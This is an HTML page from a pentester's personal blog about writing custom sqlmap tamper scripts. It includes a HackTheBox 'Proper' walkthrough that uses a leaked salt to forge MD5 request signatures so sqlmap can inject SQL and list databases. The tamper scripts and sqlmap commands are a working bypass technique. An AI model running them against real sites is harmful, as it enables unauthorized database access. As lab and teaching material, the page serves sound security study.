@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en">
+<style type="text/css">
+  ul li strong {
+    margin-left: 20px;
+  }
+  .navigation-title h3 {
+       
+      font-weight: bold;
+      padding-right: 5px;
+      width: fit-content;
+      font-family: Arial, Helvetica, sans-serif;
+      position: relative;
+      overflow: hidden;
+      padding-right: 5px;
+      white-space: nowrap;
+      margin: 0;
+      color: red !important;
+      border-right: 4px solid white;
+      transition: 0.5s;
+      animation-direction: alternate;
+      display: inline-block !important;
+       
+      animation:  sd 1s linear infinite;
+
+  }
+  @keyframes sd {
+    from {
+      border-right-color: white;
+    }
+    to {
+      border-right-color: transparent;
+    }
+  }
+  @keyframes wewe {
+    from {
+      width: 0px ;
+    }
+    to {
+      width: 118px ;
+    }
+  }
+
+  table {
+    font-family: arial, sans-serif;
+    border-collapse: collapse;
+    width: 100%;
+  }
+  
+  td, th {
+    border: 1px solid;
+    padding: 8px;
+  }
+  strong{
+    margin: 0 !important;
+  }
+    .code-style {
+      background-color: #1a1d1e !important;
+      color: rgb(213, 209, 203) !important;
+    }
+</style>
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Kareem ALsadeq">
+<meta name="keywords" content="blog,pentester,personal">
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="Kareem Alsadeq&#39;s personal website"/>
+
+<meta property="og:title" content="" />
+<meta property="og:description" content="Kareem Alsadeq&#39;s personal website" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://kareemelsadek.github.io/notes/fileupload/" />
+
+
+
+
+  <title>ALsadeq</title>
+
+  
+  <link rel="canonical" href="https://kareemelsadek.github.io/notes/fileupload/">
+  
+
+  <link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.d0d974af9060db1f638bc87d1142862c434e0df7c8f2272ef0e8ed5590cef186.css" integrity="sha256-0Nl0r5Bg2x9ji8h9EUKGLENODffI8icu8OjtVZDO8YY=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+  
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.01ce5a59759539162fb20573a28d9572f4f718f648ae0c0cb12d0b09bea975bc.css" integrity="sha256-Ac5aWXWVORYvsgVzoo2VcvT3GPZIrgwMsS0LCb6pdbw=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+      <meta property="og:image" content="/sqlmap.png" />
+      <meta property="og:type" content="website" />
+      <meta property="og:url" content="https://kareemelsadek.github.io/posts/tamper"/>
+      <meta property="og:title" content="Tamper script" />
+      <meta property="og:description" content="Write your custom Tamper Script"/>	
+ 
+
+
+
+
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+  <link rel="alternate" type="application/rss+xml" href="/notes/fileupload/index.xml" title="ALsadeq" />
+
+
+  <meta name="generator" content="Hugo 0.101.0" />
+
+
+  
+
+</head>
+
+
+
+
+
+
+<head>
+  <title>test</title>
+</head>
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      <h3>
+      ALsadeq
+    </h3>
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Blogs</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/notes/">Notes</a>
+            </li>
+            
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+<div class="content">
+    <section class="container ">
+        <h1>Write your custom Tamper Script</h1>
+        <ul>
+            <li>
+                In security assessments, we sometimes discover a custom filter, so we need a custom bypass or obfuscation for our payloads, then add this custom technique to a tool to ease the enumeration and exploitation processes of this case.
+            </li>
+            <li>
+                So we can apply this to<strong> sqlmap</strong> with the <code class="code-style" >--tamper</code> option.
+            </li>
+            <li>
+              There are built-in tamper scripts in sqlmap like:
+          </li>
+            <ul>
+              <li><strong>between :</strong> Replaces greater than operator ( <code class="code-style">></code>) with ` <code class="code-style">NOT BETWEEN 0 AND #</code> and equals operator (<code class="code-style">=</code>) with <code class="code-style">BETWEEN # AND #</code></li>
+              <li><strong>base64encode :</strong> Base64-encodes all characters in a given payload</li>
+              <li><strong>space2comment :</strong> Replaces space character (<code class="code-style"> </code>) with comments <code class="code-style">`/</code></li>
+            </ul>
+            <li>
+              But sometimes we need to bypass a filter using custom exploitations, so we can do this in sqlmap using a custom Tamper script 
+          </li>
+            <li>
+                Tamper Python script template:
+                <pre><code class="code-style">
+    # Needed imports
+    from lib.core.enums import PRIORITY
+
+    # Define which is the order of application of tamper scripts against
+    # the payload
+    __priority__ = PRIORITY.NORMAL
+
+    def tamper(payload):
+        '''
+        Description of your tamper script
+        '''
+        retVal = payload
+
+        # your code to tamper the original payload
+
+        # return the tampered payload
+        return retVal
+                </code></pre>
+            </li>
+            <li>
+                <code class="code-style">__priority__</code> is responsible for the priority of execution of the tamper script when we concatenate it with other tamper scripts, as:
+                <code class="code-style">--tamper=between,cutom_tamper.py</code>
+                <br>The PRIORITY enum is defined in <code class="code-style">&lt;sqlmap installation directory&gt;/lib/core/enums.py</code>.
+            </li>
+            <li>
+                The function we are interested in is <code class="code-style">tamper()</code>, which modifies the SQL payload.
+            </li>
+        </ul>
+        <h3>Simple Example</h3>
+        <ul>
+            <li>
+                If there is a filter that blocks <code class="code-style">AND</code> &amp; <code class="code-style">OR</code> operators, we can bypass it with <code class="code-style">&amp;&amp;</code> and <code class="code-style">||</code>.
+            </li>
+            <li>
+                So, to enumerate &amp; dump with sqlmap in this case, we need to write a simple custom tamper script as follows:
+                <pre><code class="code-style">
+    #!/usr/bin/env python
+    from lib.core.enums import PRIORITY
+    import re
+    __priority__ = PRIORITY.NORMAL
+
+    def dependencies():
+        pass
+
+    def tamper(payload, **kwargs):
+        bypass = re.sub(r'\\bOR\\b', '||', payload)
+        bypass = re.sub(r'\\bAND\\b', '&&', bypass)
+        return bypass
+                </code></pre>
+            </li>
+            <li>
+                Put the script in a directory with <code class="code-style">__init__.py</code> in the same directory.
+            </li>
+            <li>
+                Then we can use <strong>sqlmap</strong> as:
+                <pre><code class="code-style">sqlmap -u http://www.example.com?id=1 -p id --tamper=&lt;directory&gt;/custom_tamper.py</code></pre>
+            </li>
+        </ul>
+        <h2 <strong style="color:red">HTB: Proper Scenario</h2>
+        <ul>
+            <li>
+                From <code class="code-style">Burp History</code> tap, we discovered an AJAX request by javascript to:
+                <br><code class="code-style">/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b</code>
+            </li>
+            <li>
+                The response is the HTML for the <strong>various products part</strong> of the page:
+                <pre><code class="code-style">
+    HTTP/1.1 200 OK
+    Content-Type: text/html; charset=UTF-8
+    Server: Microsoft-IIS/10.0
+    X-Powered-By: PHP/7.4.1
+    Date: Fri, 26 Feb 2021 17:36:00 GMT
+    Connection: close
+    Content-Length: 10968
+
+    &lt;div class="row"&gt;&lt;div class="col-md-4"&gt;
+        &lt;div class="hover-item"&gt;
+        &lt;img src="assets/img/shop/memdoubler-pro.png" class="img-responsive smoothie wow fadeIn" data-wow-delay="0.5s" alt=""&gt;
+        &lt;div class="overlay-item-caption smoothie wow fadeIn" data-wow-delay="0.5s"&gt;
+    ...[snip]...
+                </code></pre>
+            </li>
+            <li>
+                The request has two GET parameters, <code class="code-style">order</code> &amp; <code class="code-style">h</code>. <code class="code-style">order=id desc</code> looks like part of an <strong>SQL query</strong>. The value given in <code class="code-style">h</code> looks like an <strong>MD5</strong> hash. If we change <code class="code-style">desc</code> to <code class="code-style">asc</code> (changing the sort order), the page returns <strong>403</strong>.
+            </li>
+            <li>
+                Leaving <code class="code-style">order=id desc</code> and making any changes to <code class="code-style">h</code> also returns the same message.
+            </li>
+            <li>
+                The first thought, in this case, is to hash <code class="code-style">id desc</code> using <strong>MD5</strong>, but it doesn’t match:
+                <pre><code class="code-style">
+    echo -n "id desc" | md5sum
+    aa5a97b10a6dd87160868d2316ab2425  -
+                </code></pre>
+            </li>
+            <li>
+                Sending <code class="code-style">/products-ajax.php?order=id+desc&amp;h=</code> with nothing following returns a <strong>500</strong> error with "Parameter missing or malformed."
+            </li>
+            <li>
+                But when <code class="code-style">h</code> is removed, it results in another <strong>500</strong> error but with crash info:
+                <pre><code class="code-style">
+    &lt;!-- [8] Undefined index: h
+    On line 6 in file C:\inetpub\wwwroot\products-ajax.php
+    1 |   // SECURE_PARAM_SALT needs to be defined prior including functions.php
+    2 |   define('SECURE_PARAM_SALT','hie0shah6ooNoim');
+    3 |   include('functions.php');
+    4 |   include('db-config.php');
+    5 |   if ( !$_GET['order'] || !$_GET['h'] ) {                &lt;&lt;&lt;&lt;&lt; Error encountered in this line.
+    6 |     // Set the response code to 500
+    7 |     http_response_code(500);
+    8 |     // and die(). Someone fiddled with the parameters.
+    9 |     die('Parameter missing or malformed.');
+    10 |   }
+    11 |
+    // --&gt;
+    Parameter missing or malformed.
+                </code></pre>
+            </li>
+            <li>
+                The crash shows the definition of a variable, <code class="code-style">SECURE_PARAM_SALT</code>. In a case like this, a salt is used in hashing to prevent someone from guessing the algorithm and then being able to reproduce the hash.
+            </li>
+            <li>
+                So now let’s try to guess the salt combination with the <code class="code-style">order</code> parameter:
+                <pre><code class="code-style">
+    echo -n "hie0shah6ooNoimid desc" | md5sum
+    a1b30d31d344a5a4e41e8496ccbdd26b  -
+                </code></pre>
+                and it matches the initial value of <code class="code-style">h</code> in the AJAX request, so we can start testing SQLi with this encryption process as:
+                <pre><code class="code-style">
+    root@kali$ echo -n "hie0shah6ooNoimid desc'" | md5sum
+    242d281d06a8d273e24a2fc7a3d89d08  -
+    root@kali$ curl -I 'http://10.10.10.231/products-ajax.php?order=id+asc&amp;h=242d281d06a8d273e24a2fc7a3d89d08'
+    HTTP/1.1 500 Internal Server Error
+    Content-Type: text/html; charset=UTF-8
+    Server: Microsoft-IIS/10.0
+    X-Powered-By: PHP/7.4.1
+    Date: Fri, 26 Feb 2021 18:38:50 GMT
+    Connection: close
+    Content-Length: 0
+                </code></pre>
+                This indicates that there could be SQL injection, and we need to use <strong>SqlMap</srtong>.
+            </li>
+        </ul>
+        <h3 <strong style="color:red">Custom Tamper script</h3>
+        <ul>
+            <li>
+                The default mode in SqlMap will fail here because any injection it tries will result in a <strong>500</strong> error because of the hash.
+            </li>br
+            <li>
+                So now we can write a custom tamper script to bypass this restriction by encrypting each payload with the salt, reaching the exploitation.
+            </li>
+            <li>
+                The trick here is that the return of the tamper script will be added to each injectable parameter in the request. After troubleshooting by using <code class="code-style">--proxy</code> to see sqlmap traffic through Burp History, I finally came up with this simple script:
+                <pre><code class="code-style">
+    #!/usr/bin/env python
+    from lib.core.enums import PRIORITY
+    from hashlib import md5
+
+    __priority__ = PRIORITY.NORMAL
+
+    def dependencies():
+        pass
+
+    def tamper(payload, **kwargs):
+        hashed = md5(f'hie0shah6ooNoim{payload}'.encode()).hexdigest()
+        return "{}&amp;h={}".format(payload, hashed)
+                </code></pre>
+            </li>
+            <li>
+                Then exploit with the following sqlmap command:
+                <pre><code class="code-style">
+    sqlmap -u "http://10.10.10.231/products-ajax.php?order=id+desc" --tamper=/customtamper/custom_tamper.py --dbs
+                </code></pre>
+            </li>
+            <li>
+                As we can notice in the sqlmap command, I removed the <code class="code-style">h</code> parameter, which will be added with the custom values generated through our tamper script.
+            </li>
+        </ul>
+        <h3>Refrences:</h3>
+          <ul>
+            <li>
+              <a target="_blank" href="https://0xdf.gitlab.io/">0xdf Blog</a>
+            </li>
+            <li>
+              <a target="_blank" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage#tamper-injection-data">SQLMap</a>
+            </li>
+            <li>
+              <a target="_blank" href="https://www.sans.org/blog/sqlmap-tamper-scripts-for-the-win/">SANS scenario</a>
+            </li>
+            <li>
+              <a target="_blank" href="https://academy.hackthebox.com/module/details/58">HTB Academy SQLMap Essentials</a>
+            </li>
+            <li>
+              <a target="_blank" href="https://shellsharks.com/sqlmap-tamper-magic">Another good scenario</a>
+            </li>
+          </ul>
+
+
+    </section>
+
+</div>    
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2022
+     Kareem ALsadeq 
+    ·
+    
+    Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+  
+  <script src="/js/coder.min.95c87ce84e6a12567a7de2ec1bf4cd9bd1affff21ebbba9398b7130116893991.js" integrity="sha256-lch86E5qElZ6feLsG/TNm9Gv//Ieu7qTmLcTARaJOZE="></script>
+  
+
+  
+
+  
+
+  <script>
+(function(f, a, t, h, o, m){
+	a[h]=a[h]||function(){
+		(a[h].q=a[h].q||[]).push(arguments)
+	};
+	o=f.createElement('script'),
+	m=f.getElementsByTagName('script')[0];
+	o.async=1; o.src=t; o.id='fathom-script';
+	m.parentNode.insertBefore(o,m)
+})(document, window, '//cdn.usefathom.com/tracker.js', 'fathom');
+fathom('set', 'siteId', 'ABCDE');
+fathom('trackPageview');
+</script>
+
+
+  <script async defer data-domain="alsadeq.github.io" src="https://plausible.io/js/plausible.js"></script>
+
+
+  <script data-goatcounter="https://55555.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+
+
+  
+
+  <script type="application/javascript">
+  var _paq = window._paq = window._paq || [];
+   
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="https://kareemelsadek.github.io/";
+    _paq.push(['setTrackerUrl', u+'matomo.php']);
+    _paq.push(['setSiteId', 'ABCDE']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+
+
+  
+<script async src="https://www.googletagmanager.com/gtag/js?id=gid"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'gid');
+</script>
+
+
+  <script type="text/javascript">
+    !function(T,l,y){var S=T.location,k="script",D="connectionString",C="ingestionendpoint",I="disableExceptionTracking",E="ai.device.",b="toLowerCase",w="crossOrigin",N="POST",e="appInsightsSDK",t=y.name||"appInsights";(y.name||T[e])&&(T[e]=t);var n=T[t]||function(d){var g=!1,f=!1,m={initialize:!0,queue:[],sv:"5",version:2,config:d};function v(e,t){var n={},a="Browser";return n[E+"id"]=a[b](),n[E+"type"]=a,n["ai.operation.name"]=S&&S.pathname||"_unknown_",n["ai.internal.sdkVersion"]="javascript:snippet_"+(m.sv||m.version),{time:function(){var e=new Date;function t(e){var t=""+e;return 1===t.length&&(t="0"+t),t}return e.getUTCFullYear()+"-"+t(1+e.getUTCMonth())+"-"+t(e.getUTCDate())+"T"+t(e.getUTCHours())+":"+t(e.getUTCMinutes())+":"+t(e.getUTCSeconds())+"."+((e.getUTCMilliseconds()/1e3).toFixed(3)+"").slice(2,5)+"Z"}(),name:"Microsoft.ApplicationInsights."+e.replace(/-/g,"")+"."+t,sampleRate:100,tags:n,data:{baseData:{ver:2}}}}var h=d.url||y.src;if(h){function a(e){var t,n,a,i,r,o,s,c,u,p,l;g=!0,m.queue=[],f||(f=!0,t=h,s=function(){var e={},t=d.connectionString;if(t)for(var n=t.split(";"),a=0;a<n.length;a++){var i=n[a].split("=");2===i.length&&(e[i[0][b]()]=i[1])}if(!e[C]){var r=e.endpointsuffix,o=r?e.location:null;e[C]="https://"+(o?o+".":"")+"dc."+(r||"services.visualstudio.com")}return e}(),c=s[D]||d[D]||"",u=s[C],p=u?u+"/v2/track":d.endpointUrl,(l=[]).push((n="SDK LOAD Failure: Failed to load Application Insights SDK script (See stack for details)",a=t,i=p,(o=(r=v(c,"Exception")).data).baseType="ExceptionData",o.baseData.exceptions=[{typeName:"SDKLoadFailed",message:n.replace(/\./g,"-"),hasFullStack:!1,stack:n+"\nSnippet failed to load ["+a+"] -- Telemetry is disabled\nHelp Link: https://go.microsoft.com/fwlink/?linkid=2128109\nHost: "+(S&&S.pathname||"_unknown_")+"\nEndpoint: "+i,parsedStack:[]}],r)),l.push(function(e,t,n,a){var i=v(c,"Message"),r=i.data;r.baseType="MessageData";var o=r.baseData;return o.message='AI (Internal): 99 message:"'+("SDK LOAD Failure: Failed to load Application Insights SDK script (See stack for details) ("+n+")").replace(/\"/g,"")+'"',o.properties={endpoint:a},i}(0,0,t,p)),function(e,t){if(JSON){var n=T.fetch;if(n&&!y.useXhr)n(t,{method:N,body:JSON.stringify(e),mode:"cors"});else if(XMLHttpRequest){var a=new XMLHttpRequest;a.open(N,t),a.setRequestHeader("Content-type","application/json"),a.send(JSON.stringify(e))}}}(l,p))}function i(e,t){f||setTimeout(function(){!t&&m.core||a()},500)}var e=function(){var n=l.createElement(k);n.src=h;var e=y[w];return!e&&""!==e||"undefined"==n[w]||(n[w]=e),n.onload=i,n.onerror=a,n.onreadystatechange=function(e,t){"loaded"!==n.readyState&&"complete"!==n.readyState||i(0,t)},n}();y.ld<0?l.getElementsByTagName("head")[0].appendChild(e):setTimeout(function(){l.getElementsByTagName(k)[0].parentNode.appendChild(e)},y.ld||0)}try{m.cookie=l.cookie}catch(p){}function t(e){for(;e.length;)!function(t){m[t]=function(){var e=arguments;g||m.queue.push(function(){m[t].apply(m,e)})}}(e.pop())}var n="track",r="TrackPage",o="TrackEvent";t([n+"Event",n+"PageView",n+"Exception",n+"Trace",n+"DependencyData",n+"Metric",n+"PageViewPerformance","start"+r,"stop"+r,"start"+o,"stop"+o,"addTelemetryInitializer","setAuthenticatedUserContext","clearAuthenticatedUserContext","flush"]),m.SeverityLevel={Verbose:0,Information:1,Warning:2,Error:3,Critical:4};var s=(d.extensionConfig||{}).ApplicationInsightsAnalytics||{};if(!0!==d[I]&&!0!==s[I]){var c="onerror";t(["_"+c]);var u=T[c];T[c]=function(e,t,n,a,i){var r=u&&u(e,t,n,a,i);return!0!==r&&m["_"+c]({message:e,url:t,lineNumber:n,columnNumber:a,error:i}),r},d.autoExceptionInstrumented=!0}return m}(y.cfg);function a(){y.onInit&&y.onInit(n)}(T[t]=n).queue&&0===n.queue.length?(n.queue.push(a),n.trackPageView({})):a()}(window,document,{
+    src: "https://js.monitor.azure.com/scripts/b/ai.2.min.js", 
+    
+    
+    
+    crossOrigin: "anonymous", 
+    
+    cfg: { 
+        connectionString: "connectionstring"
+         
+    }});
+    </script>    
+
+<script type="text/javascript">
+    let whoami = document.querySelector(".navigation-title h3");
+    let textContent = whoami.textContent;
+    whoami.textContent = "";
+    let i = 0;
+    let addLetters = setInterval(() =>{
+      whoami.textContent += textContent[i];
+      i++;
+      i == textContent.length ? clearInterval(addLetters) : "";
+    },300)
+  </script>
+</body>
+
+</html>
+
+
+
+
